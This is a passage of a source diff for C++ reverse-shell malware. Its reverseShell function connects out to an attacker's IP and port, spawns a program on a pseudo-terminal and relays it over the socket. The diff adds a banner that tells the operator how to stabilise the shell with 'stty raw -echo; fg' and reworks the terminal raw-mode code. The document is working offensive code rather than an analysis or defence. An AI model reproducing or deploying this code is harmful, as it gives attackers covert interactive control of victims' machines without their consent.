@@ -30,9 +30,14 @@ void reverseShell(const std::string& ip, int port, const std::string& exe_path) 
     }
     printf("[+] Connected to %s:%d\n", ip.c_str(), port);
 
-    // Send a message to the target using
+    // Send a message to the target
     char buf[1024];
-    sprintf(buf, "[+] Spawned %s for user: %s\n", exe_path.c_str(), getenv("USER"));
+    sprintf(buf, "[+] Spawned %s for user: %s\n"
+                 "== Instructions to Stabilise Your Shell ==\n"
+                 "echo \"stty rows $(tput lines) cols $(tput cols); reset\"; stty raw -echo; fg;\n"
+                 "1. Copy the above line.\n"
+                 "2. Press CTRL+Z and paste the copied command.\n"
+                 "3. Press enter twice and then copy and paste the output line.\n", exe_path.c_str(), getenv("USER"));
     send(sock, buf, strlen(buf), 0);
 
     // Get socket fileno
@@ -52,17 +57,18 @@ void reverseShell(const std::string& ip, int port, const std::string& exe_path) 
         execl(exe_path.c_str(), exe_path.c_str(), nullptr);
     }
 
-    // Try to set the PTY to raw mode
-    struct termios mode {};
-    tcgetattr(master, &mode);
-    mode.c_lflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);
-    mode.c_lflag &= ~(OPOST);
-    mode.c_lflag &= ~(CSIZE | PARENB);
-    mode.c_lflag |= (CS8);
-    mode.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);
-    mode.c_cc[VMIN] = 1;
-    mode.c_cc[VTIME] = 0;
-    tcsetattr(master, TCSAFLUSH, &mode);
+    // Make the PTY fully interactive
+    setenv("TERM", "xterm", 1);
+
+    // stty raw -echo
+    struct termios tty{};
+    tcgetattr(0, &tty);
+    tty.c_lflag &= ~ICANON;
+    tty.c_lflag &= ~ECHO;
+    tty.c_cc[VMIN] = 1;
+
+    // Reset the terminal
+    tcsetattr(0, TCSANOW, &tty);
 
     // Continuously bridge the PTY and the socket
     while (true) {
